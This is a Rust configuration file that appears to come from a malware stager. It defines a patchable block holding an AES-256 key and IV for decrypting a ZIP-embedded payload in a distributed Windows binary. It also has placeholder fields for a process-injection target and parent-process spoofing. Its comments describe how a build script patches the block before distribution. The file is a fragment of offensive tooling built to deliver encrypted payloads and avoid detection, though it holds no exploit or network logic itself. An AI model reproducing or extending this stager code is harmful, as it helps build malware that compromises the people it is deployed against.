// config.rs
// STAGER_CONFIG is a static block with a known magic header.
// At compile time it contains placeholder bytes.
// build.py finds the magic and patches key + iv
// before the binary is distributed.
//
// inject_target and ppid_proc are unused by this stager variant but kept
// in the struct so the patcher (patch_stager) works without modification.

#[repr(C)]
pub struct StagerConfig {
    pub magic:         [u8; 9],   // STAGERCFG — used by patcher to locate the block
    pub key:           [u8; 32],  // AES-256 key for ZIP-embedded payload  (patched)
    pub iv:            [u8; 16],  // AES-CBC IV                            (patched)
    pub inject_target: [u8; 64],  // unused by direct_exec; kept for patcher compat
    pub ppid_proc:     [u8; 64],  // unused by direct_exec; kept for patcher compat
}

// Non-zero placeholders ensure the block lands in .data (not .bss)
// so it is present as-is in the compiled PE.
#[no_mangle]
pub static mut STAGER_CONFIG: StagerConfig = StagerConfig {
    magic:         *b"STAGERCFG",
    key:           [b'K'; 32],
    iv:            [b'I'; 16],
    inject_target: [b'T'; 64],
    ppid_proc:     [b'P'; 64],
};

impl StagerConfig {
    pub fn key(&self) -> &[u8; 32] { &self.key }
    pub fn iv(&self)  -> &[u8; 16] { &self.iv  }
}
